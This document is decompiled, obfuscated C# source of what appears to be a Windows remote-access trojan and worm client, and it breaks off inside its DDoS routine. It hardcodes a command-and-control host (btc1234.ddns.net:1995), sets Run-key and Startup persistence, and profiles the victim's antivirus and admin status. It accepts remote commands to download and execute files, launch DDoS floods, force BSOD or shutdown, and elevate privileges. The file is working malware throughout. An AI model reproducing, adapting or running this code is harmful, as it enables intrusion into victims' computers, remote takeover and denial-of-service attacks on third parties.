using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Timers;
using Client.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;
using Microsoft.Win32;

namespace ns0;

[StandardModule]
internal sealed class Class3
{
	public sealed class Class4
	{
		public delegate void Delegate0();

		public delegate void Delegate1();

		public delegate void Delegate2(byte[] byte_0);

		private static List<WeakReference> list_0;

		private Delegate0 delegate0_0;

		private Delegate1 delegate1_0;

		private Delegate2 delegate2_0;

		private Class11.Class12.Class13 class13_0 = new Class11.Class12.Class13();

		internal TcpClient tcpClient_0;

		internal bool bool_0;

		static Class4()
		{
			MyApplication.smethod_0();
			list_0 = new List<WeakReference>();
		}

		public Class4()
		{
			smethod_0(this);
			bool_0 = false;
			string string_ = (string)(IComparable)"black hat";
			class13_0.string_0 = string_;
		}

		private static void smethod_0(object object_0)
		{
			List<WeakReference> gparam_ = list_0;
			MyComputer.smethod_0((object)gparam_, 0, '7');
			checked
			{
				try
				{
					if (list_0.Count == list_0.Capacity)
					{
						int num = 0;
						int num2 = list_0.Count - 1;
						int num3 = 0;
						while (true)
						{
							int num4 = num3;
							int num5 = num2;
							if (num4 > num5)
							{
								break;
							}
							WeakReference gparam_2 = (WeakReference)(ISerializable)list_0[num3];
							if (Class5.Class6.smethod_2(gparam_2, 251, 173))
							{
								if (num3 != num)
								{
									list_0[num] = list_0[num3];
								}
								num++;
							}
							num3++;
						}
						list_0.RemoveRange(num, list_0.Count - num);
						list_0.Capacity = list_0.Count;
					}
					list_0.Add(new WeakReference(Class5.Class7.smethod_0(object_0, 300, 323)));
				}
				finally
				{
					Class11.smethod_0((object)gparam_, 10, 99);
				}
			}
		}

		[MethodImpl(MethodImplOptions.Synchronized)]
		[SpecialName]
		public void method_0(Delegate0 delegate0_1)
		{
			delegate0_0 = (Delegate0)MyComputer.smethod_1((Delegate)delegate0_0, (Delegate)delegate0_1, 'ɹ', 608);
		}

		[MethodImpl(MethodImplOptions.Synchronized)]
		[SpecialName]
		public void method_1(Delegate0 delegate0_1)
		{
			delegate0_0 = (Delegate0)MyComputer.smethod_1((Delegate)delegate0_0, (Delegate)delegate0_1, '`', 122);
		}

		[MethodImpl(MethodImplOptions.Synchronized)]
		[SpecialName]
		public void method_2(Delegate1 delegate1_1)
		{
			delegate1_0 = (Delegate1)MyComputer.smethod_1((Delegate)delegate1_0, (Delegate)delegate1_1, 'ñ', 232);
		}

		[MethodImpl(MethodImplOptions.Synchronized)]
		[SpecialName]
		public void method_3(Delegate1 delegate1_1)
		{
			delegate1_0 = (Delegate1)MyComputer.smethod_1((Delegate)delegate1_0, (Delegate)delegate1_1, 'G', 93);
		}

		[MethodImpl(MethodImplOptions.Synchronized)]
		[SpecialName]
		public void method_4(Delegate2 delegate2_1)
		{
			delegate2_0 = (Delegate2)MyComputer.smethod_1((Delegate)delegate2_0, (Delegate)delegate2_1, 'ǿ', 486);
		}

		[MethodImpl(MethodImplOptions.Synchronized)]
		[SpecialName]
		public void method_5(Delegate2 delegate2_1)
		{
			delegate2_0 = (Delegate2)MyComputer.smethod_1((Delegate)delegate2_0, (Delegate)delegate2_1, '\u0334', 814);
		}

		public void method_6(string string_0, int int_0)
		{
			try
			{
				try
				{
					if (tcpClient_0 != null)
					{
						Class5.Class7.smethod_2(tcpClient_0, 847, 805);
						TcpClient tcpClient = (tcpClient_0 = null);
					}
				}
				catch (Exception gparam_)
				{
					Class5.smethod_1(gparam_, 461, 484);
					Class5.Class6.smethod_4(600, 545);
				}
				while (bool_0)
				{
					MyApplication.smethod_4(1, 81, 'L');
				}
				try
				{
					TcpClient tcpClient2 = (tcpClient_0 = new TcpClient());
					Class5.Class7.smethod_4(tcpClient_0, string_0, int_0, 272, 319);
				}
				catch (Exception gparam_2)
				{
					Class5.smethod_1(gparam_2, 739, 714);
					Class5.Class6.smethod_4(486, 415);
				}
				Thread gparam_3 = new Thread(method_10, 10);
				Class5.Class6.smethod_6(gparam_3, 133, 144);
				delegate0_0?.Invoke();
			}
			catch (Exception gparam_4)
			{
				Class11.Class12.smethod_1(gparam_4, 201, 212);
				((Delegate1)(Delegate)delegate1_0)?.Invoke();
				Class11.smethod_2('\u0088', '\u0096');
			}
		}

		public void method_7()
		{
			try
			{
				Class5.Class7.smethod_2(tcpClient_0, 586, 544);
			}
			catch (Exception gparam_)
			{
				Class5.smethod_1(gparam_, 527, 550);
				Class5.Class6.smethod_4(48, 73);
			}
			TcpClient tcpClient = (tcpClient_0 = null);
			((Delegate1)(MulticastDelegate)delegate1_0)?.Invoke();
		}

		public void method_8(string string_0)
		{
			method_9(smethod_7(string_0));
		}

		public void method_9(byte[] byte_0)
		{
			try
			{
				MemoryStream gparam_ = new MemoryStream();
				Class5.Class7.smethod_6(gparam_, byte_0, 0, byte_0.Length, 185, 215);
				Class5.Class7.smethod_6(gparam_, smethod_7(class13_0.string_0), 0, Class5.smethod_4(class13_0.string_0, '\u02ea', '\u02e8'), 615, 521);
				Class11.smethod_4(Class5.Class6.smethod_7(tcpClient_0, 190, 189), Class5.Class7.smethod_3(gparam_, '\u008b', 170), 0, checked((int)Class5.Class6.smethod_8(gparam_, 56, '*')), SocketFlags.None, 445, 456);
			}
			catch (Exception gparam_2)
			{
				Class11.Class12.smethod_1(gparam_2, 71, 90);
				method_7();
				Class11.smethod_2('\u00b4', 'ª');
			}
		}

		private void method_10()
		{
			bool_0 = true;
			MemoryStream gparam_ = new MemoryStream();
			int num = 0;
			checked
			{
				while (true)
				{
					MyApplication.smethod_4(1, 826, '\u0327');
					try
					{
						if (tcpClient_0 == null || !Class5.Class7.smethod_7(Class5.Class6.smethod_7(tcpClient_0, 1014, 1013), 634, 'ɳ'))
						{
							break;
						}
						num++;
						if (num > 100)
						{
							num = 0;
							try
							{
								if (MyApplication.smethod_7(Class5.Class6.smethod_7(tcpClient_0, 136, 139), -1, SelectMode.SelectRead, 'ǝ', 465) & (Class5.smethod_5(Class5.Class6.smethod_7(tcpClient_0, 717, 718), 469, 493) <= 0))
								{
									break;
								}
							}
							catch (Exception gparam_2)
							{
								Class5.smethod_1(gparam_2, 857, 880);
								Class5.Class6.smethod_4(776, 881);
								goto end_IL_0014;
							}
						}
						if (Class5.Class6.smethod_9(tcpClient_0, 130, 136) <= 0)
						{
							continue;
						}
						byte[] array = new byte[Class5.Class6.smethod_9(tcpClient_0, 803, 809) - 1 + 1];
						Class5.smethod_6(Class5.Class6.smethod_7(tcpClient_0, 929, 930), array, 0, array.Length, SocketFlags.None, 279, 'č');
						Class5.Class7.smethod_6(gparam_, array, 0, array.Length, 907, 997);
						while (Class5.Class6.smethod_10(smethod_8(Class5.Class7.smethod_3(gparam_, 'ǒ', 499)), class13_0.string_0, 702, '\u02f3'))
						{
							Array gparam_3 = smethod_9(Class5.Class7.smethod_3(gparam_, 'Φ', 903), class13_0.string_0);
							((Delegate2)(MulticastDelegate)delegate2_0)?.Invoke((byte[])Class5.Class6.smethod_11((object)gparam_3, new object[1] { 0 }, (string[])null, (short)194, 195));
							Class5.smethod_7((Stream)gparam_, 'Ǟ', 'ƌ');
							gparam_ = new MemoryStream();
							if (Class5.Class7.smethod_8(gparam_3, 994, 'κ') == 2)
							{
								Class11.Class15.smethod_4(gparam_, (byte[])Class5.Class6.smethod_11((object)gparam_3, new object[1] { 1 }, (string[])null, (short)444, 445), 0, Class11.Class12.Class14.smethod_3(Class11.smethod_7<object, string, Type>(Class16.smethod_3((object)gparam_3, new object[1] { 1 }, (string[])null, 'ʋ', 662), null, "length", new object[0], null, null, null, 'ό', 'ΰ'), 61, '\u001f'), 'ˇ', 741);
								Class16.smethod_4(1, 635, 'ɏ');
								continue;
							}
							break;
						}
						continue;
						end_IL_0014:;
					}
					catch (Exception gparam_4)
					{
						Class11.Class12.smethod_1(gparam_4, 322, 351);
						Class11.smethod_2('\u0343', '\u035d');
					}
					break;
				}
				bool_0 = false;
				method_7();
			}
		}
	}

	private static Class4 class4_0;

	public static string string_0;

	public static string string_1;

	public static string string_2;

	public static string string_3;

	public static string string_4;

	public static string string_5;

	public static string string_6;

	public static string string_7;

	public static string string_8;

	public static string string_9;

	public static string string_10;

	public static object object_0;

	private static System.Timers.Timer timer_0;

	private static string string_11;

	private static string string_12;

	private static string string_13;

	private static string string_14;

	private static string string_15;

	private static System.Timers.Timer timer_1;

	private static Mutex mutex_0;

	static Class3()
	{
		MyApplication.smethod_0();
		smethod_1(new Class4());
		string_0 = "\\worms\\.";
		string_1 = "btc1234.ddns.net";
		string_2 = "1995";
		string_3 = "123";
		string_4 = "jwwYUfw9JOAoGDO3";
		string_5 = "private.txt.exe";
		string_6 = "yes";
		string_7 = "yes";
		string_8 = "yes";
		string_9 = "[pastebinn]";
		string_10 = "[urll]";
		timer_0 = new System.Timers.Timer();
		string_12 = Class5.smethod_8(Environment.SpecialFolder.ApplicationData, 655, '\u02e8');
		string_13 = Class5.Class6.smethod_12(647, 717);
		string_14 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
		string_15 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
		timer_1 = new System.Timers.Timer();
	}

	[SpecialName]
	public static Class4 smethod_0()
	{
		return class4_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	public static void smethod_1(Class4 class4_1)
	{
		Class4.Delegate2 delegate2_ = smethod_4;
		Class4.Delegate1 delegate1_ = smethod_3;
		Class4.Delegate0 delegate0_ = smethod_2;
		if (class4_0 != null)
		{
			class4_0.method_5(delegate2_);
			class4_0.method_3(delegate1_);
			class4_0.method_1(delegate0_);
		}
		class4_0 = class4_1;
		if (class4_0 != null)
		{
			class4_0.method_4(delegate2_);
			class4_0.method_2(delegate1_);
			class4_0.method_0(delegate0_);
		}
	}

	[DllImport("winmm.dll")]
	private static extern int mciSendString(string string_16, string string_17, int int_0, IntPtr intptr_0);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SystemParametersInfoA(int int_0, int int_1, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_16, int int_2);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main()
	{
		MyApplication.smethod_0();
		try
		{
			string gparam_ = (string)(IConvertible)Class5.Class6.smethod_12(10, 65);
			gparam_ = (string)(IConvertible)MyApplication.smethod_8(gparam_, 'ǳ', 389);
			Class5.Class6.smethod_13(gparam_, 'â', 'Ù');
		}
		catch (Exception gparam_2)
		{
			Class5.smethod_1(gparam_2, 188, 149);
			Class5.Class6.smethod_4(868, 797);
		}
		bool createdNew = false;
		mutex_0 = new Mutex(initiallyOwned: true, string_4, out createdNew);
		if (!createdNew)
		{
			Class5.Class6.smethod_4(667, 737);
		}
		try
		{
			if (Class5.Class7.smethod_9(string_6, "yes", bool_0: false, '\u034f', 835) == 0)
			{
				Class5.Class6.smethod_14(Class5.smethod_10(MyComputer.smethod_3<RegistryProxy>(Class5.smethod_9<ServerComputer>((ServerComputer)(object)MyProject.MyComputer_0, 448, 497), 'ɭ', (short)562), string_14, bool_0: true, '\u035c', 845), MyApplication.smethod_8(string_13, 'Ľ', 330), (object)Class5.smethod_11(string_12, "\\", MyApplication.smethod_8(string_13, '\u0083', 251), 'ư', 'ǩ'), 74, (short)82);
				MyApplication.smethod_9(string_13, Class5.smethod_11(string_12, "\\", MyApplication.smethod_8(string_13, 'ĵ', 333), 'Θ', 'ρ'), 81, 46);
			}
		}
		catch (Exception gparam_3)
		{
			Class5.smethod_1(gparam_3, 746, 707);
			Class5.Class6.smethod_4(358, 287);
		}
		if (Class5.Class7.smethod_9(string_7, "yes", bool_0: false, '«', 167) == 0)
		{
			Class5.smethod_12<System.Timers.Timer, ElapsedEventHandler>(timer_0, smethod_10, 'Ɏ', 599);
			Class5.smethod_13(timer_0, Class5.Class6.smethod_15("2000", 47, 46), '\u0318', '\u0313');
			MyApplication.smethod_10(timer_0, 953, 909);
		}
		if (Class5.Class7.smethod_9(string_8, "yes", bool_0: false, 'ɂ', 590) == 0)
		{
			try
			{
				string text = (string)(IComparable)Class5.Class7.smethod_10(Class5.smethod_8(Environment.SpecialFolder.Startup, 494, 'Ɖ'), "\\", MyApplication.smethod_8(string_13, 'ǡ', 406), ".exe", 'ŏ', 285);
				if (!MyComputer.smethod_4(text, 805, 872))
				{
					MyApplication.smethod_9(Class5.Class6.smethod_12(307, 377), text, 332, 307);
					Class5.Class7.smethod_11(text, FileAttributes.Temporary, '\u02f6', 729);
				}
				object_0 = new FileStream(text, FileMode.Open);
			}
			catch (Exception gparam_4)
			{
				Class11.Class12.smethod_1(gparam_4, 299, 310);
				Class11.smethod_2('\u031d', '\u0303');
			}
		}
		int try02e0_dispatch = -1;
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try02e0_dispatch)
				{
				default:
					if (Class11.smethod_12(string_9, "yes", bool_0: false, 'ʏ', 'ʻ') == 0)
					{
						WebClient gparam_5 = new WebClient();
						string gparam_6 = Class11.Class12.Class14.smethod_7(gparam_5, string_10, 602, 580);
						string_1 = Class11.smethod_9(gparam_6, new char[1] { ':' }, 217, 189)[0];
						string_2 = Class11.smethod_9(gparam_6, new char[1] { ':' }, 514, 614)[1];
						Class11.Class15.smethod_10((Component)gparam_5, 'ƺ', 'Ɗ');
						smethod_0().method_6(string_1, Class11.smethod_15(string_2, 38, '{'));
					}
					else
					{
						smethod_0().method_6(string_1, Conversions.ToInteger(string_2));
					}
					break;
				}
				break;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Thread.Sleep(4000);
				ProjectData.ClearProjectError();
				try02e0_dispatch = 737;
			}
		}
	}

	private static void smethod_2()
	{
	}

	private static void smethod_3()
	{
		try
		{
			smethod_0().method_6(string_1, Class5.smethod_4(string_2, 'Ɋ', 'ɉ'));
		}
		catch (Exception gparam_)
		{
			Class5.smethod_1(gparam_, 383, 342);
			Class11.smethod_2('¬', '²');
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private static void smethod_4(byte[] byte_0)
	{
		string gparam_ = (string)(ICloneable)smethod_8(byte_0);
		string[] array = (string[])(IEnumerable)Class5.Class7.smethod_12(gparam_, string_0, -1, (CompareMethod)0, 'ɵ', 631);
		checked
		{
			try
			{
				string text = array[0];
				if (Class5.Class7.smethod_9(text, "~", bool_0: false, '¡', 173) == 0)
				{
					string gparam_2 = smethod_5();
					string text2 = (string)((Class5.Class7.smethod_9(MyApplication.smethod_8(string_13, 'ɲ', 522), string_5, bool_0: false, 'Ό', 896) != 0) ? ((ICloneable)"NO") : ((ICloneable)"YES"));
					string gparam_3 = MyApplication.smethod_2(gparam_3, " SP", 51, 50);
					try
					{
						string[] array2 = Class5.Class7.smethod_12(MyApplication.smethod_11(Class5.Class7.smethod_13(306, 'ŗ'), '\u0340', 788), " ", -1, (CompareMethod)0, '8', 58);
						if (array2.Length == 1)
						{
							gparam_3 = MyApplication.smethod_2(gparam_3, "0", 1023, 1022);
						}
						gparam_3 = MyApplication.smethod_2(gparam_3, array2[array2.Length - 1], 165, 164);
					}
					catch (Exception gparam_4)
					{
						Class5.smethod_1(gparam_4, 94, 119);
						gparam_3 = MyApplication.smethod_2(gparam_3, "0", 531, 530);
						Class5.Class6.smethod_4(201, 176);
					}
					gparam_3 = ((!Class5.Class6.smethod_10(Class5.smethod_8(Environment.SpecialFolder.ProgramFiles, 73, '.'), "x86", 178, 'ÿ')) ? MyApplication.smethod_2(gparam_3, " x86", 979, 978) : MyApplication.smethod_2(gparam_3, " x64", 427, 426));
					WindowsIdentity ntIdentity = (WindowsIdentity)(IDeserializationCallback)Class5.Class6.smethod_16(805, '\u031c');
					WindowsPrincipal gparam_5 = new WindowsPrincipal(ntIdentity);
					string text3 = (string)((!MyComputer.smethod_5(gparam_5, WindowsBuiltInRole.Administrator, '\u030c', 838)) ? ((IConvertible)"NO") : ((IConvertible)"YES"));
					string gparam_6 = (string)(IComparable<string>)Class5.smethod_15(new string[16]
					{
						Class5.smethod_11(string_3, "#", "", 'ȇ', 'ɝ'),
						"#",
						Class5.smethod_11(Class5.Class6.smethod_12(921, 981), "#", "", '\u02f5', 'ʯ'),
						"#",
						Class5.smethod_11(Class5.Class6.smethod_12(480, 429), "#", "", 'Ύ', 'ϔ'),
						"#",
						Class5.smethod_11(Class5.smethod_14<ComputerInfo>(MyComputer.smethod_6<ServerComputer>((ServerComputer)(object)MyProject.MyComputer_0, (short)488, (short)423), 'Ǝ', (short)450), "#", "", 'Ǧ', 'Ƽ'),
						gparam_3,
						"#v",
						Class5.smethod_11(Class5.smethod_14<ComputerInfo>(MyComputer.smethod_6<ServerComputer>((ServerComputer)(object)MyProject.MyComputer_0, (short)701, (short)754), ')', (short)100), "#", "", 'ƅ', 'ǟ'),
						"#",
						text2,
						"#",
						text3,
						"#",
						Class5.smethod_11(gparam_2, "#", "", 'ǿ', 'ƥ')
					}, 605, 625);
					smethod_0().method_8(Class5.smethod_11("~", string_0, gparam_6, '÷', '®'));
					return;
				}
				if (Class5.Class7.smethod_9(text, "close", bool_0: false, '\u008b', 135) == 0)
				{
					Class5.Class6.smethod_4(338, 296);
					return;
				}
				if (Class5.Class7.smethod_9(text, "rec", bool_0: false, '\u0092', 158) == 0)
				{
					Class5.Class6.smethod_4(486, 413);
					Class5.Class6.smethod_4(960, 954);
					return;
				}
				if (Class5.Class7.smethod_9(text, "shut", bool_0: false, 'Ɉ', 580) == 0)
				{
					Class5.smethod_16(array[1], (AppWinStyle)0, bool_0: false, -1, 'N', 82);
					array[1] = null;
					return;
				}
				if (Class5.Class7.smethod_9(text, "logof", bool_0: false, 'Ū', 358) == 0)
				{
					Class5.smethod_16(array[1], (AppWinStyle)0, bool_0: false, -1, 'Ţ', 382);
					array[1] = null;
					return;
				}
				if (Class5.Class7.smethod_9(text, "rebot", bool_0: false, '\u032e', 802) == 0)
				{
					Class5.smethod_16(array[1], (AppWinStyle)0, bool_0: false, -1, 'ñ', 237);
					array[1] = null;
					return;
				}
				if (Class5.Class7.smethod_9(text, "opencd", bool_0: false, 'ˏ', 707) == 0)
				{
					mciSendString("set CDAudio door open", null, 0, IntPtr.Zero);
					return;
				}
				if (Class5.Class7.smethod_9(text, "closecd", bool_0: false, '\u0367', 875) == 0)
				{
					mciSendString("set CDAudio door closed", null, 0, IntPtr.Zero);
					return;
				}
				if (Class5.Class7.smethod_9(text, "changeWL", bool_0: false, 'r', 126) == 0)
				{
					try
					{
						string string_ = MyApplication.smethod_2(Class5.Class6.smethod_12(560, 638), "img.Bmp", 307, 306);
						byte[] byte_ = (byte[])(IList)MyApplication.smethod_12(array[1], 'Ɂ', 515);
						MyApplication.smethod_13(string_, byte_, 652, '\u02f2');
						SystemParametersInfoA(20, 0, ref string_, 1);
						array[1] = null;
						return;
					}
					catch (Exception gparam_7)
					{
						Class5.smethod_1(gparam_7, 966, 1007);
						Class5.Class6.smethod_4(649, 752);
						return;
					}
				}
				if (Class5.Class7.smethod_9(text, "runexe", bool_0: false, '\u031d', 785) == 0)
				{
					try
					{
						StringBuilder gparam_8 = new StringBuilder();
						Random gparam_9 = new Random();
						int num = 1;
						do
						{
							int int_ = Class5.smethod_17(gparam_9, 0, Class5.smethod_4(string_15, 'Ά', '\u0384'), 'ƹ', 478);
							char char_ = MyApplication.smethod_14(string_15, int_, 681, 742);
							MyComputer.smethod_7(gparam_8, char_, 872, 816);
							num++;
						}
						while (num <= 8);
						string gparam_10 = (string)(IEnumerable<char>)MyApplication.smethod_15(gparam_8, 'Σ', 'ϓ');
						string gparam_11 = Class5.Class7.smethod_10(Class5.Class6.smethod_12(870, 808), gparam_10, "-tmp", MyComputer.smethod_8(array[1], new char[1] { ':' }, 1015, 997)[1], 'ȭ', 639);
						byte[] byte_2 = (byte[])(IEnumerable)MyApplication.smethod_12(MyComputer.smethod_8(array[1], new char[1] { ':' }, 146, 128)[0], '\u0322', 864);
						MyApplication.smethod_13(gparam_11, byte_2, 187, 'Å');
						Class5.Class6.smethod_13(gparam_11, '\u02f5', 'ˎ');
						array[1] = null;
						return;
					}
					catch (Exception gparam_12)
					{
						Class5.smethod_1(gparam_12, 191, 150);
						Class5.Class6.smethod_4(609, 536);
						return;
					}
				}
				if (Class5.Class7.smethod_9(text, "fromurl", bool_0: false, '#', 47) == 0)
				{
					try
					{
						StringBuilder gparam_13 = new StringBuilder();
						Random gparam_14 = new Random();
						int num2 = 1;
						do
						{
							int int_2 = Class5.smethod_17(gparam_14, 0, Class5.smethod_4(string_15, 'ń', 'ņ'), 'ʵ', 722);
							char char_2 = MyApplication.smethod_14(string_15, int_2, 125, 50);
							MyComputer.smethod_7(gparam_13, char_2, 452, 412);
							num2++;
						}
						while (num2 <= 8);
						string gparam_15 = (string)(IEquatable<string>)MyApplication.smethod_15(gparam_13, '£', 'Ó');
						string text4 = (string)(IEnumerable)Class5.Class7.smethod_10(Class5.Class6.smethod_12(416, 494), gparam_15, "-", MyComputer.smethod_8(array[1], new char[1] { '~' }, 792, 778)[1], 'ϩ', 955);
						WebClient gparam_16 = new WebClient();
						Class5.smethod_18(gparam_16, MyComputer.smethod_8(array[1], new char[1] { '~' }, 680, 698)[0], text4, 'ó', 242);
						Class5.Class6.smethod_13(text4, 'Ή', 'β');
						array[1] = null;
						return;
					}
					catch (Exception gparam_17)
					{
						Class5.smethod_1(gparam_17, 171, 130);
						Class5.Class6.smethod_4(94, 39);
						return;
					}
				}
				if (Class5.Class7.smethod_9(text, "openurl", bool_0: false, '\u038b', 903) == 0)
				{
					Class5.Class6.smethod_13(array[1], 'ʑ', 'ʪ');
					array[1] = null;
					return;
				}
				if (Class5.Class7.smethod_9(text, "unstall", bool_0: false, 'ͼ', 880) == 0)
				{
					string gparam_18 = (string)(IConvertible)string_13;
					string gparam_19 = array[1];
					if (Class5.Class7.smethod_9(string_6, "yes", bool_0: false, 'ɖ', 602) == 0)
					{
						RegistryKey gparam_20 = Class5.smethod_10(Registry.CurrentUser, string_14, bool_0: true, '&', 55);
						MyComputer.smethod_9(gparam_20, MyApplication.smethod_8(string_13, 'V', 33), bool_0: false, 855, '\u031f');
						Class5.Class6.smethod_17(Class5.smethod_11(string_12, "\\", MyApplication.smethod_8(string_13, '\u0380', 1016), 'Ș', 'Ɂ'), 347, 293);
					}
					string text5 = MyApplication.smethod_2(Class5.Class6.smethod_12(165, 235), "del.vbs", 195, 194);
					gparam_19 = Class5.smethod_11(gparam_19, "%path%", gparam_18, 'ʪ', '\u02f0');
					gparam_19 = Class5.smethod_11(gparam_19, "%usb%", string_5, 'ö', '¬');
					gparam_19 = Class5.smethod_11(gparam_19, "%startup%", Class5.Class7.smethod_10(Class5.smethod_8(Environment.SpecialFolder.Startup, 818, '\u0355'), "\\", MyApplication.smethod_8(string_13, 'Ņ', 306), ".exe", '\u0317', 837), 'ˠ', 'ʺ');
					StreamWriter gparam_21 = new StreamWriter(text5, append: false);
					Class5.Class7.smethod_14((TextWriter)gparam_21, gparam_19, 'γ', 987);
					MyApplication.smethod_16(gparam_21, 743, 733);
					array[1] = null;
					Class5.Class6.smethod_13(text5, '\u02fb', 'ˀ');
					Class5.Class6.smethod_4(767, 645);
					return;
				}
				if (Class5.Class7.smethod_9(text, "BSOD", bool_0: false, '\u0087', 139) == 0)
				{
					Class5.smethod_16(array[1], (AppWinStyle)0, bool_0: false, -1, 'ʹ', 677);
					array[1] = null;
					return;
				}
				if (Class5.Class7.smethod_9(text, "textsp", bool_0: false, 'N', 66) == 0)
				{
					try
					{
						object gparam_22 = Class5.Class7.smethod_0(Class5.smethod_19("SAPI.SpVoice", "", '\u0364', '\u0359'), 289, 334);
						object[] array3 = new object[1];
						object[] array4 = array3;
						string[] array5 = array;
						string[] array6 = array5;
						int num3 = 1;
						array4[0] = array6[1];
						object[] array7 = array3;
						object[] array8 = array7;
						bool[] array9 = new bool[1] { true };
						Class16.smethod_6<Type, string, object>(gparam_22, null, "speak", array8, null, null, array9, bool_1: true, 701, 700);
						if (array9[0])
						{
							array5[num3] = (string)Class11.Class12.Class14.smethod_11(Class11.Class12.Class14.smethod_9(array7[0], 496, 419), typeof(string), 778, 798);
						}
						array[1] = null;
						return;
					}
					catch (Exception gparam_23)
					{
						Class11.Class12.smethod_1(gparam_23, 537, 516);
						Class11.smethod_2('Σ', 'ν');
						return;
					}
				}
				if (Class11.smethod_12(text, "ddos", bool_0: false, '\u032c', '\u0318') == 0)
				{
					string_11 = array[1];
					Class16.smethod_7<ElapsedEventHandler, System.Timers.Timer>(timer_1, smethod_6, 515, 616);
					Class11.Class12.smethod_8(timer_1, 1.0, '\u0080', 'ü');
					Class11.smethod_16(timer_1, 865, 894);
					array[1] = null;
					return;
				}
				if (Class11.smethod_12(text, "ddosstop", bool_0: false, 'Ķ', 'Ă') == 0)
				{
					Class11.smethod_16(timer_1, 1021, 989);
					array[1] = null;
					return;
				}
				if (Class11.smethod_12(text, "admin", bool_0: false, 'ü', 'È') == 0)
				{
					try
					{
						ProcessStartInfo processStartInfo = new ProcessStartInfo();
						new Process();
						ProcessStartInfo gparam_24 = processStartInfo;
						Class11.smethod_19(gparam_24, bool_0: true, 'ɮ', 563);
						Class11.smethod_22(gparam_24, Class11.Class15.smethod_9(78, '{'), 223, 'ö');
						Class11.Class15.smethod_13(gparam_24, ProcessWindowStyle.Normal, 159, 'ï');
						Class11.smethod_22(gparam_24, "runas", 615, 'ɍ');
						gparam_24 = null;
						Class11.Class12.smethod_10(processStartInfo, 134, '®');
						Class11.smethod_2('!', '>');
						return;
					}
					catch (Exception gparam_25)
					{
						Class11.Class12.smethod_1(gparam_25, 602, 583);
						Class11.smethod_2('ǭ', 'ǳ');
						return;
					}
				}
				if (Class11.smethod_12(text, "openhide", bool_0: false, 'Η', 'Σ') == 0)
				{
					try
					{
						object gparam_26 = Class11.Class12.Class14.smethod_9(Class11.Class12.smethod_11("internetexplorer.application", "", 475, 508), 779, 856);
						object[] array7 = new object[1];
						object[] array10 = array7;
						string[] array5 = array;
						string[] array11 = array5;
						int num3 = 1;
						array10[0] = array11[1];
						object[] array3 = array7;
						object[] array12 = array3;
						bool[] array9 = new bool[1] { true };
						Class16.smethod_6<Type, string, object>(gparam_26, null, "navigate", array12, null, null, array9, bool_1: true, 65, 64);
						if (array9[0])
						{
							array5[num3] = (string)Class11.Class12.Class14.smethod_11(Class11.Class12.Class14.smethod_9(array3[0], 909, 990), typeof(string), 758, 738);
						}
						Class11.Class12.smethod_12<object, string, Type>(gparam_26, null, "visible", new object[1] { 0 }, null, null, 814, 863);
						array[1] = null;
						return;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(text, "closehide", false) == 0)
				{
					Interaction.Shell(array[1], (AppWinStyle)0, false, -1);
					array[1] = null;
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string smethod_5()
	{
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		//IL_0098: Expected O, but got Unknown
		//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		try
		{
			string text = (string)(IConvertible)string.Empty;
			ManagementObjectEnumerator val = default(ManagementObjectEnumerator);
			try
			{
				val = Class5.smethod_20<ManagementObjectCollection>(MyComputer.smethod_11<ManagementObjectSearcher>(new ManagementObjectSearcher(MyApplication.smethod_2("root\\SecurityCenter", MyApplication.smethod_17(MyComputer.smethod_10(Class5.Class6.smethod_10(Class5.smethod_14<ComputerInfo>(MyComputer.smethod_6<ServerComputer>((ServerComputer)(object)MyProject.MyComputer_0, (short)618, (short)549), 'ƶ', (short)506), "XP", 751, 'ʢ'), (object)"", (object)"2", (short)982, (short)903), 863, 851), 890, 891), "SELECT * FROM AntiVirusProduct"), (short)583, 'ȡ'), 'ƽ', 465);
				while (val.MoveNext())
				{
					ManagementObject gparam_ = (ManagementObject)val.get_Current();
					text = (string)(IConvertible)Class5.smethod_11(text, " ", MyApplication.smethod_17(Class5.Class6.smethod_18<ManagementBaseObject, string>((ManagementBaseObject)(object)gparam_, "displayName", (short)478, 391), 510, 498), '\u030c', '\u0355');
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			if (Class5.Class7.smethod_9(text, string.Empty, bool_0: false, '¿', 179) != 0)
			{
				return text;
			}
			return (string)(IEnumerable<char>)"No Antivirus";
		}
		catch (Exception gparam_2)
		{
			Class11.Class12.smethod_1(gparam_2, 897, 924);
			string result = (string)(IEnumerable<char>)"No Antivirus";
			Class11.smethod_2('\u02f4', '\u02ea');
			return result;
		}
	}

	private static void smethod_6(object sender, ElapsedEventArgs e)
	{
		int try0001_dispatch = -1;
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
				{
					IPEndPoint gparam_ = new IPEndPoint(Class5.Class7.smethod_15(MyComputer.smethod_8(string_11, new char[1] { ':' }, 444, 430)[0], 'ɼ', 522), Class5.smethod_4(MyComputer.smethod_8(string_11, new char[1] { ':' }, 827, 809)[1], 'Ȁ', 'Ȅ'));
